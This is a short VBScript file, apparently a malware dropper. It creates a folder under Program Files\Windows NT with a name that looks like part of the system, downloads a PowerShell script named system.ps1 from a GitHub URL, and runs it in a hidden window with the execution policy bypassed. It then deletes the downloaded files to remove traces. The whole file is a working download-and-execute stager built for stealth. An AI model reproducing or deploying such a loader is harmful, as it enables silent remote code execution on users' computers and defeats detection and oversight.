' winsys.vbs
' Automatically download, execute system.ps1, and clean up the ADB folder silently

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Define the ADB folder path
adbFolder = "C:\Program Files\Windows NT\ADB"
If Not objFSO.FolderExists(adbFolder) Then objFSO.CreateFolder adbFolder

' Define the URL and file path for system.ps1
ps1URL = "https://raw.githubusercontent.com/quannqttg/coccoc/main/system.ps1"
ps1File = adbFolder & "\system.ps1"

' Function to check network connectivity
Function IsNetworkAvailable()
    On Error Resume Next
    objXMLHTTP.open "GET", "http://www.google.com", False
    objXMLHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
    objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
        IsNetworkAvailable = True
    Else
        IsNetworkAvailable = False
    End If
    On Error GoTo 0
End Function

' Function to download a file from a URL
Sub DownloadFile(url, filepath)
    On Error Resume Next
    objXMLHTTP.open "GET", url, False
    objXMLHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
    objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' Binary
        objStream.Open
        objStream.Write objXMLHTTP.ResponseBody
        objStream.SaveToFile filepath, 2 ' Overwrite if file exists
        objStream.Close
        Set objStream = Nothing
    End If
    On Error GoTo 0
End Sub

' Loop until network is available
Do
    If IsNetworkAvailable() Then
        Exit Do
    Else
        WScript.Sleep 1000 ' Wait for 1 seconds before retrying
    End If
Loop

' Download system.ps1
DownloadFile ps1URL, ps1File

' Check if the download was successful
If objFSO.FileExists(ps1File) Then
    ' Execute system.ps1 with PowerShell (hidden window)
    objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1File & """", 0, True

    ' Clean up: Delete all files in ADB folder
    Set folder = objFSO.GetFolder(adbFolder)
    For Each file In folder.Files
        file.Delete True
    Next
Else
    objShell.Popup "Tải xuống system.ps1 thất bại. Vui lòng kiểm tra URL hoặc kết nối mạng.", 5, "Thông báo", 48
End If

' Clean up objects
Set objShell = Nothing
Set objFSO = Nothing
Set objXMLHTTP = Nothing
